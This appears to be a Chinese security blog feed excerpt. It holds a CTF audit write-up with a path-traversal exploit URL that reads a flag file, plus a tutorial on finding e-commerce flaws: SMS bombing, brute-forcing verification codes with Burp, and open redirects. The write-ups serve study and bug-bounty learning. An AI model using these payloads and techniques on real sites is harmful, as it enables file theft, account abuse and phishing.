<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130153259922.png" alt="image-20201130153259922"></p>
<h2 id="&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;"><a href="#&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;" class="headerlink" title="&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;"></a>&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;</h2><p><code>application/manage/controller/Backup.php</code>#downloadBak </p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130153740566.png" alt="image-20201130153740566"></p>
<p>finename&#x53EF;&#x63A7;&#xFF0C;&#x76EE;&#x5F55;&#x7A7F;&#x8D8A; </p>
<p>Exp:</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">http://wdb-vul/index.php/manage/backup/downloadBak?file=../../../../../../../../../Users/p2hm1n/Desktop/flag</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="&#x6587;&#x4EF6;&#x4E0A;&#x4F20;"><a href="#&#x6587;&#x4EF6;&#x4E0A;&#x4F20;" class="headerlink" title="&#x6587;&#x4EF6;&#x4E0A;&#x4F20;"></a>&#x6587;&#x4EF6;&#x4E0A;&#x4F20;</h2><p>&#x53D1;&#x73B0;&#x5148;&#x77E5;&#x5DF2;&#x7ECF;&#x6709;&#x5E08;&#x5085;&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x7684;&#x6F0F;&#x6D1E;&#x70B9;&#x4E86; <a href="https://xz.aliyun.com/t/7838" target="_blank" rel="noopener">https://xz.aliyun.com/t/7838</a></p>
<p>&#x8DDF;&#x7740;&#x590D;&#x73B0;&#x5206;&#x6790;&#x4E00;&#x6CE2;&#x3002;</p>
<p><code>application/admin/controller/Plugs.php</code> &#x4E3B;&#x8981;&#x662F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x7684;&#x4E00;&#x4E9B;&#x6821;&#x9A8C;&#x3002;</p>
<p>&#x4E0A;&#x4F20;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x5148;&#x8C03;&#x7528; <code>upstate</code>&#xFF0C;&#x4E3B;&#x8981;&#x4F5C;&#x7528;&#x5982;&#x4E0B;&#xFF1A;</p>
<ol>
<li>&#x5C06;&#x901A;&#x8FC7; POST &#x4F20;&#x5165;&#x7684; md5 &#x503C;&#x4EE5;16&#x4F4D;&#x5B57;&#x6BCD;&#x4E3A;&#x95F4;&#x9694;&#x8FDB;&#x884C;&#x5206;&#x5272;&#xFF0C;&#x5E76;&#x62FC;&#x63A5;&#x4F20;&#x5165;filename &#x7684;&#x540E;&#x7F00;</li>
<li>&#x68C0;&#x6D4B;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4E0A;&#x4F20;</li>
<li>&#x751F;&#x6210; config &#x6570;&#x7EC4;&#xFF0C;&#x5E76;&#x6DFB;&#x52A0;&#x6BCF;&#x4E00;&#x4E2A;&#x952E;&#x7684;&#x503C;</li>
</ol>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130193500442.png" alt="image-20201130193500442"></p>
<p>&#x4E4B;&#x540E;&#x8C03;&#x7528; <code>upload</code> &#xFF0C;&#x8FD9;&#x91CC;&#x770B;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x5904;&#x7406;&#x7684;&#x4F4D;&#x7F6E;</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130212324561.png" alt="image-20201130212324561"></p>
<p>&#x8DDF;&#x8FDB; <code>move</code></p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130212827808.png" alt="image-20201130212827808"></p>
<p>&#x8DDF;&#x8FDB; <code>buildSaveName</code> </p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130212940148.png" alt="image-20201130212940148"></p>
<p>final POC</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130192319757.png" alt="image-20201130192319757"></p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130192330685.png" alt="image-20201130192330685"></p>
<p>&#x4E0A;&#x4F20;&#x81F3; static &#x76EE;&#x5F55;</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130192305239.png" alt="image-20201130192305239"></p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130192722214.png" alt="image-20201130192722214"></p>
</body></html>]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>以购物流程挖掘商城漏洞</title>
    <url>/2019/09/05/%E4%BB%A5%E8%B4%AD%E7%89%A9%E6%B5%81%E7%A8%8B%E6%8C%96%E6%8E%98%E5%95%86%E5%9F%8E%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<html><head></head><body><p>&#x6587;&#x7AE0;&#x9996;&#x53D1;&#x4E8E;&#x5148;&#x77E5;&#x793E;&#x533A;&#xFF1A;<a href="https://xz.aliyun.com/t/6194" target="_blank" rel="noopener">https://xz.aliyun.com/t/6194</a></p>
<a id="more"></a>

<h1 id="&#x8BF4;&#x5728;&#x524D;&#x9762;"><a href="#&#x8BF4;&#x5728;&#x524D;&#x9762;" class="headerlink" title="&#x8BF4;&#x5728;&#x524D;&#x9762;"></a>&#x8BF4;&#x5728;&#x524D;&#x9762;</h1><p><strong>&#x672C;&#x6587;&#x9488;&#x5BF9;&#x4EBA;&#x7FA4;</strong>&#xFF1A;&#x5F88;&#x591A;&#x670B;&#x53CB;&#x4EEC;&#x63A5;&#x89E6;&#x5B89;&#x5168;&#x90FD;&#x662F;&#x901A;&#x8FC7;&#x4E66;&#x7C4D;&#xFF1B;&#x7F51;&#x4E0A;&#x6D41;&#x4F20;&#x7684;PDF&#xFF1B;&#x4EA6;&#x6216;&#x662F;&#x901A;&#x8FC7;&#x8BBA;&#x575B;&#x91CC;&#x7684;&#x6587;&#x7AE0;&#xFF0C;&#x4F46;&#x53EF;&#x80FD;&#x7ECF;&#x8FC7;&#x4E86;&#x8FD9;&#x6837;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x7684;&#x5B66;&#x4E60;&#xFF0C;&#x4E86;&#x89E3;&#x4E86;&#x4E00;&#x4E9B;&#x5E38;&#x89C1;&#x6F0F;&#x6D1E;&#x7684;&#x539F;&#x7406;&#x4E4B;&#x540E;&#xFF0C;&#x5BF9;&#x4E8E;&#x6F0F;&#x6D1E;&#x6316;&#x6398;&#x8FD8;&#x4E0D;&#x662F;&#x5F88;&#x6E05;&#x695A;&#xFF0C;&#x751A;&#x81F3;&#x4E0D;&#x660E;&#x767D;&#x5982;&#x4F55;&#x4E0B;&#x624B;&#x2026;</p>
<p>&#x53EF;&#x80FD;&#x4F60;&#x901A;&#x8FC7; sql-labs &#x521D;&#x6B65;&#x638C;&#x63E1;&#x4E86;sql&#x6CE8;&#x5165;&#xFF0C;&#x4EA6;&#x6216;&#x662F;&#x4F60;&#x901A;&#x8FC7; upload-labs &#x521D;&#x6B65;&#x638C;&#x63E1;&#x4E86;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF0C;&#x6216;&#x8005;&#x4F60;&#x901A;&#x8FC7; DVWA &#x7684;&#x5B66;&#x4E60;&#x521D;&#x6B65;&#x638C;&#x63E1;&#x4E86;&#x5176;&#x4ED6;&#x4E00;&#x4E9B;&#x5E38;&#x89C1;&#x6F0F;&#x6D1E;&#x3002;<br>&#x4F46;&#x662F;&#x4ED6;&#x4EEC;&#x90FD;&#x6709;&#x4E00;&#x4E2A;&#x5F0A;&#x7AEF;&#x662F;&#xFF1A;<strong>&#x4F60;&#x5DF2;&#x7ECF;&#x77E5;&#x9053;&#x8FD9;&#x4E2A;&#x5730;&#x65B9;&#x6709;&#x6F0F;&#x6D1E;&#xFF0C;&#x751A;&#x81F3;&#x4F60;&#x77E5;&#x9053;&#x662F;&#x4EC0;&#x4E48;&#x7C7B;&#x578B;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x4F60;&#x53EA;&#x8981;&#x60F3;&#x529E;&#x6CD5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;</strong><br>&#x4F46;&#x662F;&#x5728;&#x8FDB;&#x884C;&#x6F0F;&#x6D1E;&#x6316;&#x6398;&#x7684;&#x65F6;&#x5019;&#xFF1A;<strong>&#x4F60;&#x5F80;&#x5F80;&#x4E0D;&#x77E5;&#x9053;&#x54EA;&#x4E2A;&#x5730;&#x65B9;&#x6709;&#x6F0F;&#x6D1E;&#xFF0C;&#x6216;&#x8005;&#x8BF4;&#x4F60;&#x4E0D;&#x77E5;&#x9053;&#x8FD9;&#x4E2A;&#x5730;&#x65B9;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x4EC0;&#x4E48;&#x6F0F;&#x6D1E;</strong></p>
<p>&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x4F60;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x770B;&#x4E00;&#x4E0B; <strong>&#x4E4C;&#x4E91;&#x955C;&#x50CF;&#x7AD9;</strong>&#xFF08;&#x5927;&#x5BB6;&#x53EF;&#x81EA;&#x884C;&#x767E;&#x5EA6;&#xFF0C;&#x8C37;&#x6B4C;&#xFF09;&#x2026;&#x901A;&#x8FC7;&#x4E00;&#x4E9B;&#x524D;&#x8F88;&#x4EEC;&#x7684;&#x6F0F;&#x6D1E;&#x6316;&#x6398;&#x62A5;&#x544A;&#x6765;&#x4E86;&#x89E3;&#x4E00;&#x4E0B;&#xFF1A;<strong>&#x4F60;&#x6240;&#x638C;&#x63E1;&#x7684;&#x6F0F;&#x6D1E;&#x7684;&#x5E38;&#x89C1;&#x89E6;&#x53D1;&#x70B9;&#x5728;&#x54EA;&#xFF0C;&#x6216;&#x8005;&#x8BF4;&#x4E00;&#x4E2A;&#x7F51;&#x7AD9;&#x54EA;&#x4E9B;&#x5730;&#x65B9;&#x5177;&#x6709;&#x6F0F;&#x6D1E;</strong></p>
<p>&#x56E0;&#x4E3A;&#x6316;&#x6398; SRC &#x4E0D;&#x4EC5;&#x9700;&#x8981;&#x6536;&#x96C6;&#x5168;&#x9762;&#x7684;&#x8D44;&#x4EA7;&#xFF0C;&#x800C;&#x4E14;&#x5F88;&#x591A;&#x7F51;&#x7AD9;&#x90FD;&#x6709;&#x5404;&#x5F0F;&#x5404;&#x6837;&#x7684; waf &#xFF0C;&#x5BF9;&#x4E8E;&#x521A;&#x63A5;&#x89E6;&#x6F0F;&#x6D1E;&#x6316;&#x6398;&#x7684;&#x670B;&#x53CB;&#x4EEC;&#x6765;&#x8BF4;&#x5C31;&#x4E0D;&#x662F;&#x90A3;&#x4E48;&#x53CB;&#x597D;&#xFF0C;&#x6240;&#x4EE5;&#x5BF9;&#x4E8E;&#x521A;&#x63A5;&#x89E6;&#x6F0F;&#x6D1E;&#x6316;&#x6398;&#x7684;&#x670B;&#x53CB;&#x4EEC;&#x6765;&#x8BF4;&#xFF0C;&#x5728;&#x6316;&#x6398; SRC &#x4E4B;&#x524D;&#xFF0C;&#x5F88;&#x591A;&#x4EBA;&#x90FD;&#x662F;&#x4ECE; <a href="https://www.butian.net/" target="_blank" rel="noopener">&#x8865;&#x5929;</a>; <a href="https://www.vulbox.com/" target="_blank" rel="noopener">&#x6F0F;&#x6D1E;&#x76D2;&#x5B50;</a>; <a href="https://xianzhi.aliyun.com/productitem/index.htm#/home" target="_blank" rel="noopener">&#x5148;&#x77E5;</a> &#x6162;&#x6162;&#x8D70;&#x8FC7;&#x6765;&#x7684;&#x3002;</p>
<p>&#x95EE;&#xFF1A;&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x9009;&#x62E9;&#x5546;&#x57CE;&#x578B;&#x7F51;&#x7AD9;&#x7684;&#x6316;&#x6398;&#xFF1F;<br>&#x7B54;&#xFF1A;&#x5546;&#x57CE;&#x5728;&#x65E5;&#x5E38;&#x7684;&#x4F7F;&#x7528;&#x4E2D;&#x6BD4;&#x8F83;&#x666E;&#x53CA;&#xFF08;&#x5E94;&#x8BE5;&#x6CA1;&#x6709;&#x4EBA;&#x6CA1;&#x6709;&#x7528;&#x8FC7;&#x6DD8;&#x5B9D;&#x5427;&#x2026;&#xFF09;&#xFF0C;&#x529F;&#x80FD;&#x70B9;&#x76F8;&#x5BF9;&#x6765;&#x8BF4;&#x6BD4;&#x8F83;&#x591A;&#xFF0C;&#x800C;&#x4E14;&#x6211;&#x4EEC;&#x6BD4;&#x8F83;&#x719F;&#x6089;&#x7F51;&#x7AD9;&#x7684;&#x529F;&#x80FD;&#x70B9;&#xFF0C;&#x4E00;&#x662F;&#x4E0D;&#x7528;&#x53BB;&#x5F88;&#x9EBB;&#x70E6;&#x7684;&#x5BFB;&#x627E;&#x7F51;&#x7AD9;&#x7684;&#x529F;&#x80FD;&#x70B9;&#xFF0C;&#x6BD5;&#x7ADF;&#x5927;&#x5BB6;&#x5E73;&#x5E38;&#x90FD;&#x8981;&#x8D2D;&#x7269;&#x3002;&#x4E8C;&#x662F;&#x5546;&#x57CE;&#x7684;&#x529F;&#x80FD;&#x70B9;&#x76F8;&#x6BD4;&#x4E8E;&#x4E00;&#x4E9B;&#x9759;&#x6001;&#x7F51;&#x7AD9;&#x8981;&#x591A;&#x5F88;&#x591A;&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x80FD;&#x4EA7;&#x751F;&#x7684;&#x6F0F;&#x6D1E;&#x4F1A;&#x76F8;&#x5BF9;&#x8F83;&#x591A;&#xFF0C;&#x6545;&#x800C;&#x6316;&#x6398;&#x5230;&#x6F0F;&#x6D1E;&#x7684;&#x51E0;&#x7387;&#x4E5F;&#x4F1A;&#x63D0;&#x5347;&#x3002;</p>
<p>&#x95EE;&#xFF1A;&#x8FD9;&#x6837;&#x7684;&#x7F51;&#x7AD9;&#x4ECE;&#x54EA;&#x91CC;&#x627E;&#x5230;&#x5462;&#xFF1F;<br>&#x7B54;&#xFF1A;&#x7AD9;&#x957F;&#x4E4B;&#x5BB6;&#xFF0C;&#x8C37;&#x6B4C;&#x9AD8;&#x7EA7;&#x8BED;&#x6CD5;&#x641C;&#x7D22;&#x7B49;<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190831223409-64b2c95c-cbfc-1.png" alt></p>
<p>&#x7531;&#x4E8E;&#x5F88;&#x591A;&#x5927;&#x4F6C;&#x5F80;&#x5F80;&#x5728;&#x8FDB;&#x884C;&#x6F0F;&#x6D1E;&#x6316;&#x6398;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x90FD;&#x662F;&#x51ED;&#x501F;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x5C0F;&#x5DE5;&#x5177;&#xFF0C;&#x6216;&#x8005;&#x662F;&#x76F4;&#x63A5;&#x51ED;&#x501F;&#x7D2F;&#x79EF;&#x7684;&#x7ECF;&#x9A8C;&#x5BF9;&#x529F;&#x80FD;&#x70B9;&#x8FDB;&#x884C;&#x5B9A;&#x5411;&#x7684;&#x6F0F;&#x6D1E;&#x6316;&#x6398;&#x3002;&#x8FD9;&#x6837;&#x7684;&#x9AD8;&#x6548;&#x7387;&#x6F0F;&#x6D1E;&#x6316;&#x6398;&#x663E;&#x7136;&#x4E0D;&#x9002;&#x5408;&#x4E00;&#x4E9B;&#x521A;&#x63A5;&#x89E6;&#x6F0F;&#x6D1E;&#x6316;&#x6398;&#x7684;&#x670B;&#x53CB;&#x4EEC;&#xFF0C;&#x90A3;&#x4E48;&#x672C;&#x6587;&#x4E2D;&#x6211;&#x4EEC;&#x5C31;&#x5148;&#x629B;&#x5F00;&#x8FD9;&#x4E9B;&#x5927;&#x4F6C;&#x4EEC;&#x7684;&#x5DE5;&#x5177;&#x3002;&#x901A;&#x8FC7;&#x6B63;&#x5E38;&#x7684;&#x8D2D;&#x7269;&#x6D41;&#x7A0B;&#x6765;&#x5BF9;&#x5546;&#x57CE;&#x8FDB;&#x884C;&#x6F0F;&#x6D1E;&#x6316;&#x6398;&#xFF0C;&#x4EE5;&#x5927;&#x5BB6;&#x65E5;&#x5E38;&#x7684;&#x751F;&#x6D3B;&#x65B9;&#x5F0F;&#x6316;&#x51FA;&#x6F0F;&#x6D1E;&#x3002;</p>
<p><strong>&#x56E0;&#x4E3A;&#x4E00;&#x4E9B;&#x7279;&#x6B8A;&#x539F;&#x56E0;&#xFF0C;&#x672C;&#x6587;&#x5C31;&#x62FF; &#x6DD8;&#x5B9D; &#x505A;&#x4F8B;&#x5B50;&#x6765;&#x6F14;&#x793A;&#x4EE5;&#x8D2D;&#x7269;&#x6D41;&#x7A0B;&#x6765;&#x8FDB;&#x884C;&#x6F0F;&#x6D1E;&#x6316;&#x6398;&#x3002;&#x672C;&#x6587;&#x6D89;&#x53CA;&#x5230;&#x7684;&#x6F0F;&#x6D1E;&#x5728;&#x6DD8;&#x5B9D;&#x4E2D;&#x5747;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x4F46;&#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x81EA;&#x884C;&#x6839;&#x636E;&#x6587;&#x7AE0;&#x5185;&#x5BB9;&#x4E3E;&#x4E00;&#x53CD;&#x4E09;</strong></p>
<h1 id="&#x767B;&#x5F55;&#x8FC7;&#x7A0B;"><a href="#&#x767B;&#x5F55;&#x8FC7;&#x7A0B;" class="headerlink" title="&#x767B;&#x5F55;&#x8FC7;&#x7A0B;"></a>&#x767B;&#x5F55;&#x8FC7;&#x7A0B;</h1><h2 id="&#x6CE8;&#x518C;&#x8D26;&#x53F7;"><a href="#&#x6CE8;&#x518C;&#x8D26;&#x53F7;" class="headerlink" title="&#x6CE8;&#x518C;&#x8D26;&#x53F7;"></a>&#x6CE8;&#x518C;&#x8D26;&#x53F7;</h2><h3 id="&#x5570;&#x55E6;&#x51E0;&#x53E5;"><a href="#&#x5570;&#x55E6;&#x51E0;&#x53E5;" class="headerlink" title="&#x5570;&#x55E6;&#x51E0;&#x53E5;"></a>&#x5570;&#x55E6;&#x51E0;&#x53E5;</h3><p>&#x5728;&#x6CE8;&#x518C;&#x8D26;&#x53F7;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x4E0D;&#x60F3;&#x56E0;&#x4E3A;&#x4F60;&#x968F;&#x624B;&#x53D1;&#x51FA;&#x53BB;&#x7684;&#x8868;&#x5355;&#xFF0C;&#x800C;&#x5BFC;&#x81F4;&#x4F60;&#x7684;&#x7535;&#x8BDD;&#x88AB;&#x6253;&#x7206;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E00;&#x4E9B;&#x5728;&#x7EBF;&#x63A5;&#x6536;&#x77ED;&#x4FE1;&#x7684;&#x5E73;&#x53F0;&#x8FDB;&#x884C;&#x624B;&#x673A;&#x6CE8;&#x518C;&#x2026;&#xFF08;&#x8840;&#x548C;&#x6CEA;&#x7684;&#x6559;&#x8BAD;<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190831223412-668b62e8-cbfc-1.png" alt></p>
<p>&#x56E0;&#x6B64;&#x5728;&#x8FD9;&#x91CC;&#x63D0;&#x4F9B;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x5E38;&#x7528;&#x7684;&#x77ED;&#x4FE1;&#x63A5;&#x7801;&#x5E73;&#x53F0;</p>
<p><a href="http://www.smszk.com/" target="_blank" rel="noopener">&#x514D;&#x8D39;&#x63A5;&#x6536;&#x77ED;&#x4FE1;</a><br><a href="http://www.z-sms.com/" target="_blank" rel="noopener">Z-SMS</a><br><a href="https://getfreesmsnumber.com/" target="_blank" rel="noopener">GetFreeSMSNumber</a><br><a href="https://www.freeonlinephone.org/" target="_blank" rel="noopener">Free Online Phone</a><br><a href="http://mail.bccto.me/" target="_blank" rel="noopener">10&#x5206;&#x949F;&#x90AE;&#x7BB1; </a><br><a href="http://24mail.chacuo.net/" target="_blank" rel="noopener">&#x4E34;&#x65F6;&#x90AE;&#x7BB1;&#x3001;&#x4E34;&#x65F6;&#x7535;&#x5B50;&#x90AE;&#x7BB1;&#x3001;24&#x5C0F;&#x65F6;&#x90AE;&#x7BB1;</a></p>
<h3 id="&#x77ED;&#x4FE1;&#x8F70;&#x70B8;"><a href="#&#x77ED;&#x4FE1;&#x8F70;&#x70B8;" class="headerlink" title="&#x77ED;&#x4FE1;&#x8F70;&#x70B8;"></a>&#x77ED;&#x4FE1;&#x8F70;&#x70B8;</h3><p>&#x5728;&#x8FDB;&#x884C;&#x7528;&#x6237;&#x6CE8;&#x518C;&#x65F6;&#x5B58;&#x5728;&#x53D1;&#x9001;&#x77ED;&#x4FE1;&#x7684;&#x754C;&#x9762;&#x3002;&#x53D1;&#x73B0;<strong>&#x53D1;&#x9001;&#x77ED;&#x4FE1;&#x65F6;&#x4E0D;&#x9700;&#x8981;&#x8F93;&#x5165;&#x9A8C;&#x8BC1;&#x7801;&#x624D;&#x80FD;&#x53D1;&#x9001;</strong>&#xFF0C;&#x4E14;<strong>&#x4E0D;&#x9650;&#x5236;&#x53D1;&#x9001;&#x7684;&#x9A8C;&#x8BC1;&#x7801;&#x7684;&#x6B21;&#x6570;</strong>&#xFF0C;&#x6216;<strong>&#x53D1;&#x9001;&#x9A8C;&#x8BC1;&#x7801;&#x65F6;&#x5B58;&#x5728;&#x7ED5;&#x8FC7;</strong><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190831223414-67c32b8c-cbfc-1.png" alt></p>
<p>&#x7ED5;&#x8FC7;&#x59FF;&#x52BF;&#xFF1A;<a href="https://www.anquanke.com/post/id/93878" target="_blank" rel="noopener">&#x6316;&#x6D1E;&#x6280;&#x5DE7;&#xFF1A;&#x7ED5;&#x8FC7;&#x77ED;&#x4FE1;&amp;&#x90AE;&#x7BB1;&#x8F70;&#x70B8;&#x9650;&#x5236;&#x4EE5;&#x53CA;&#x540E;&#x7EED;</a></p>
<p><strong>&#x53EF;&#x6839;&#x636E;&#x73B0;&#x6709;&#x60C5;&#x666F;&#x81EA;&#x884C;&#x4F7F;&#x7528;&#x7ED5;&#x8FC7;&#x59FF;&#x52BF;</strong></p>
<h3 id="&#x4EFB;&#x610F;&#x7528;&#x6237;&#x6CE8;&#x518C;"><a href="#&#x4EFB;&#x610F;&#x7528;&#x6237;&#x6CE8;&#x518C;" class="headerlink" title="&#x4EFB;&#x610F;&#x7528;&#x6237;&#x6CE8;&#x518C;"></a>&#x4EFB;&#x610F;&#x7528;&#x6237;&#x6CE8;&#x518C;</h3><ul>
<li>&#x6253;&#x5F00;&#x65B9;&#x5F0F;&#x4E00;</li>
</ul>
<p>&#x5076;&#x9047;&#x8FC7;&#x4E00;&#x4E2A;&#x4E0A;&#x53E4;&#x7F51;&#x7AD9;&#xFF0C;&#x6CE8;&#x518C;&#x8D26;&#x6237;&#x65F6;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x5BF9;&#x6CE8;&#x518C;&#x7684;&#x8D26;&#x6237;&#x7684;&#x624B;&#x673A;&#x53F7;&#x6216;&#x8005;&#x90AE;&#x7BB1;&#x505A;&#x51FA;&#x9650;&#x5236;&#x3002;<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190831223417-69c77320-cbfc-1.png" alt></p>
<ul>
<li>&#x6253;&#x5F00;&#x65B9;&#x5F0F;&#x4E8C;</li>
</ul>
<p>&#x5728;&#x8FDB;&#x884C;&#x7528;&#x6237;&#x6CE8;&#x518C;&#x7684;&#x65F6;&#x5019;&#x53D1;&#x9001;&#x77ED;&#x4FE1;&#xFF0C;&#x6293;&#x5305;&#xFF0C;&#x53D1;&#x73B0;&#x5305;&#x91CC;&#x76F4;&#x63A5;&#x6709;&#x9A8C;&#x8BC1;&#x7801;<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190831223434-73963918-cbfc-1.png" alt></p>
<p>&#x4F46;&#x662F;&#x901A;&#x5E38;&#x53EF;&#x80FD;&#x9A8C;&#x8BC1;&#x7801;&#x4F1A;&#x7ECF;&#x8FC7;base64&#x7B49;&#x7F16;&#x7801;&#x624B;&#x6BB5;&#x8FDB;&#x884C;&#x7F16;&#x7801;&#xFF0C;&#x89E3;&#x7801;&#x540E;&#x4E5F;&#x53EF;&#x76F4;&#x63A5;&#x83B7;&#x5F97;&#x9A8C;&#x8BC1;&#x7801;<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190831223436-74f070f8-cbfc-1.png" alt></p>
<ul>
<li>&#x6253;&#x5F00;&#x65B9;&#x5F0F;&#x4E09;</li>
</ul>
<p>&#x53D1;&#x73B0;&#x53D1;&#x9001;&#x4E86;&#x4E00;&#x4E2A;&#x9A8C;&#x8BC1;&#x7801;&#x4E4B;&#x540E;&#xFF0C;&#x540E;&#x7AEF;&#x6CA1;&#x6709;&#x9650;&#x5236;&#x8F93;&#x5165;&#x9519;&#x8BEF;&#x7684;&#x6B21;&#x6570;&#x6216;&#x8005;&#x6CA1;&#x6709;&#x9650;&#x5236;&#x8F93;&#x5165;&#x7684;&#x65F6;&#x95F4;</p>
<p>&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;burpsuite&#x91CC;&#x9762;&#x7684;&#x7206;&#x7834;&#x6A21;&#x5757;&#x8FDB;&#x884C;&#x7206;&#x7834;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x7206;&#x7834;&#x6210;&#x529F;<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190831223436-751d5ec4-cbfc-1.png" alt></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190831223442-7867e64e-cbfc-1.png" alt></p>
<p><strong>&#x53EF;&#x6839;&#x636E;&#x73B0;&#x6709;&#x60C5;&#x666F;&#x81EA;&#x884C;&#x4F7F;&#x7528;&#x7ED5;&#x8FC7;&#x59FF;&#x52BF;</strong></p>
<h3 id="URL&#x8DF3;&#x8F6C;"><a href="#URL&#x8DF3;&#x8F6C;" class="headerlink" title="URL&#x8DF3;&#x8F6C;"></a>URL&#x8DF3;&#x8F6C;</h3><p>&#x53D1;&#x73B0;&#x6DD8;&#x5B9D;&#x767B;&#x9646;&#x754C;&#x9762;&#x7684;URL&#x4E3A;<br><code>https://login.taobao.com/member/login.jhtml?redirectURL=https%3A%2F%2Fwww.taobao.com</code><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190831223447-7b2b96a0-cbfc-1.png" alt></p>
<p>&#x66F4;&#x6539;<code>redirectURL</code>&#x53C2;&#x6570;&#x540E;&#x7684;&#x503C;&#x4E3A;&#x4F60;&#x60F3;&#x6076;&#x610F;&#x8DF3;&#x8F6C;&#x5230;&#x7684;URL,&#x5982;&#xFF1A; <code>https://www.baidu.com/</code></p>
<p>&#x767B;&#x9646;&#x6210;&#x529F;&#x540E;&#x53EF;&#x8DF3;&#x8F6C;&#x5230;&#x767E;&#x5EA6;&#x9875;&#x9762;<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190831223452-7e3fd374-cbfc-1.png" alt></p>
<p>&#x7ED5;&#x8FC7;&#x59FF;&#x52BF;&#xFF1A;<a href="https://www.anquanke.com/post/id/94377" target="_blank" rel="noopener">&#x5206;&#x4EAB;&#x51E0;&#x4E2A;&#x7ED5;&#x8FC7;URL&#x8DF3;&#x8F6C;&#x9650;&#x5236;&#x7684;&#x601D;&#x8DEF;</a></p>
<p><strong>&#x53EF;&#x6839;&#x636E;&#x73B0;&#x6709;&#x60C5;&#x666F;&#x81EA;&#x884C;&#x4F7F;&#x7528;&#x7ED5;&#x8FC7;&#x59FF;&#x52BF;</strong></p>
